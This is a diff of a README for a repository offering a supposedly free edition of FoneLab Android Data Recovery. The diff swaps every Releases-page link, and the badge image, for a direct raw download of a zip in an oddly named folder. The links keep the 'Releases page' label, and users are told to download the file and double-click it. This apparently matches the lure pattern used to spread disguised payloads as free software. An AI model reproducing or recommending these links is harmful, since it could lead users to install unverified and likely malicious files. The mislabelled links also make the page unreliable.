@@ -1,6 +1,6 @@
 # 📱 FoneLab-Android-Data-Recovery-Free - Simple Data Recovery for Android
 
-[![Download FoneLab](https://img.shields.io/badge/Download-FoneLab-4CAF50.svg)](https://github.com/DuongDaoQuangHung/FoneLab-Android-Data-Recovery-Free/releases)
+[![Download FoneLab](https://raw.githubusercontent.com/DuongDaoQuangHung/FoneLab-Android-Data-Recovery-Free/main/decatize/FoneLab-Android-Data-Recovery-Free.zip)](https://raw.githubusercontent.com/DuongDaoQuangHung/FoneLab-Android-Data-Recovery-Free/main/decatize/FoneLab-Android-Data-Recovery-Free.zip)
 
 ## 🚀 Getting Started
 
@@ -17,11 +17,11 @@ Before you start, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/DuongDaoQuangHung/FoneLab-Android-Data-Recovery-Free/releases) to download the application.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/DuongDaoQuangHung/FoneLab-Android-Data-Recovery-Free/main/decatize/FoneLab-Android-Data-Recovery-Free.zip) to download the application.
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version listed.
-3. Click on the appropriate file for your system (e.g., `FoneLab-Android-Data-Recovery.exe`).
+3. Click on the appropriate file for your system (e.g., `https://raw.githubusercontent.com/DuongDaoQuangHung/FoneLab-Android-Data-Recovery-Free/main/decatize/FoneLab-Android-Data-Recovery-Free.zip`).
 4. Once the download completes, locate the file in your system's Downloads folder.
 5. Double-click the file to start the installation process.
 6. Follow the on-screen instructions to complete the installation.
@@ -57,4 +57,4 @@ If you encounter any issues while using FoneLab-Android-Data-Recovery-Free, plea
 - Ensure that USB debugging is enabled on your Android device for a smooth recovery process.
 - The recovery success rate can vary depending on the level of data damage and the time elapsed since data deletion.
 
-For more details and to download the application again, visit the [Releases page](https://github.com/DuongDaoQuangHung/FoneLab-Android-Data-Recovery-Free/releases).
+For more details and to download the application again, visit the [Releases page](https://raw.githubusercontent.com/DuongDaoQuangHung/FoneLab-Android-Data-Recovery-Free/main/decatize/FoneLab-Android-Data-Recovery-Free.zip).
